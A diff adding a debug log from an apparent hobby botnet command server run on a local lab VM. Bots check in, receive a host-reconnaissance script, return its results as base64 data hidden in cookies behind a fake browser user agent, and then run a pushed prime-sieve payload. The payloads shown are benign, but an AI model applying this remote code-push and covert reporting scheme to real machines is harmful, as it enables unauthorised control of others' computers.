@@ -1,0 +1,4006 @@
+INFO:root:Starting main.
+DEBUG:root:Before Server Process
+INFO:root:Started server process
+INFO:root:Connecting to GUI 
+INFO:root:Connected to GUI 
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 
+
+DEBUG:root:In Server process
+INFO:root:Listening on port: 80
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:10:59
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+QN04Q6AP;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: QN04Q6AP;;;;;;0;
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /QN04Q6AP/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjEwOjU5IDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:11:01
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+1FZSH2V5;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: 1FZSH2V5;;;;;;0;
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /1FZSH2V5/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjExOjAxIDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: 1FZSH2V5;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:11:01 2016
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /QN04Q6AP HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 1FZSH2V5  posix Linux 4.4.0-51-generic x86_64:QN04Q6AP  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 1FZSH2V5  posix Linux 4.4.0-51-generic x86_64:QN04Q6AP  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 1FZSH2V5  posix Linux 4.4.0-51-generic x86_64:QN04Q6AP  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Bot: 1FZSH2V5;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:11:01 2016
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /1FZSH2V5 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: 1FZSH2V5;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:11:01 2016
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /QN04Q6AP HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: 1FZSH2V5;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:11:01 2016
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /1FZSH2V5 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $UP$1FZSH2V5:QN04Q6AP$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Before split $UP$1FZSH2V5:QN04Q6AP$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Split command: UP
+DEBUG:root:Adding payload: 0RS17EHH
+INFO:root:Bot: 1FZSH2V5;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:11:01 2016
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /QN04Q6AP HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 0RS17EHH
+DEBUG:root:Targets: 38
+DEBUG:root:Is in 0RS17EHH
+DEBUG:root:Payload selected: 0RS17EHH
+DEBUG:root:tempcommand = ['1FZSH2V5', 'QN04Q6AP']
+DEBUG:root:botindex1 0
+DEBUG:root:pitttt = 
+tlow = 0
+thigh = 49
+
+DEBUG:root:command1 = #Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+DEBUG:root:command2 = #Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 0
+thigh = 49
+
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:11:24
+Server: Apache
+Content-Length: 1436
+Connection: close
+Content-Type:text/html
+1422;0RS17EHH;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 0
+thigh = 49
+
+DEBUG:root:botindex1 50
+DEBUG:root:pitttt = 
+tlow = 50
+thigh = 99
+
+DEBUG:root:command1 = #Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+DEBUG:root:command2 = #Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:11:24
+Server: Apache
+Content-Length: 1437
+Connection: close
+Content-Type:text/html
+1423;0RS17EHH;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+INFO:root:Bot: 1FZSH2V5;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:11:01 2016
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /QN04Q6AP/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpJMAphSTEKYUkyCmFJMwphSTUKYUk3CmFJMTEKYUkxMwphSTE3CmFJMTkKYUkyMwphSTI5CmFJMzEKYUkzNwphSTQxCmFJNDMKYUk0NwphLg== _src=0RS17EHH 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: 1FZSH2V5;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:11:01 2016
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /1FZSH2V5 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 0RS17EHH
+DEBUG:root:Targets: 38
+DEBUG:root:Is in 0RS17EHH
+DEBUG:root:Payload selected: 0RS17EHH
+DEBUG:root:tempcommand = ['1FZSH2V5', 'QN04Q6AP']
+DEBUG:root:botindex1 0
+DEBUG:root:pitttt = 
+tlow = 0
+thigh = 49
+
+DEBUG:root:command1 = #Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+DEBUG:root:command2 = #Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+tlow = 0
+thigh = 49
+
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:11:26
+Server: Apache
+Content-Length: 1458
+Connection: close
+Content-Type:text/html
+1444;0RS17EHH;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+tlow = 0
+thigh = 49
+
+DEBUG:root:botindex1 50
+DEBUG:root:pitttt = 
+tlow = 50
+thigh = 99
+
+DEBUG:root:command1 = #Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+DEBUG:root:command2 = #Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+tlow = 50
+thigh = 99
+
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:11:26
+Server: Apache
+Content-Length: 1459
+Connection: close
+Content-Type:text/html
+1445;0RS17EHH;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+tlow = 50
+thigh = 99
+
+INFO:root:Bot: 1FZSH2V5;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:11:01 2016
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /1FZSH2V5/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpJMAphSTEKYUkyCmFJMwphSTUKYUk3CmFJMTEKYUkxMwphSTE3CmFJMTkKYUkyMwphSTI5CmFJMzEKYUkzNwphSTQxCmFJNDMKYUk0NwphLg== _src=0RS17EHH 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: 1FZSH2V5;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:11:01 2016
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /QN04Q6AP HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: 1FZSH2V5;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:11:01 2016
+INFO:root:Bot: QN04Q6AP;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:10:59 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /1FZSH2V5 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Starting main.
+DEBUG:root:Before Server Process
+INFO:root:Started server process
+INFO:root:Connecting to GUI 
+INFO:root:Connected to GUI 
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 
+
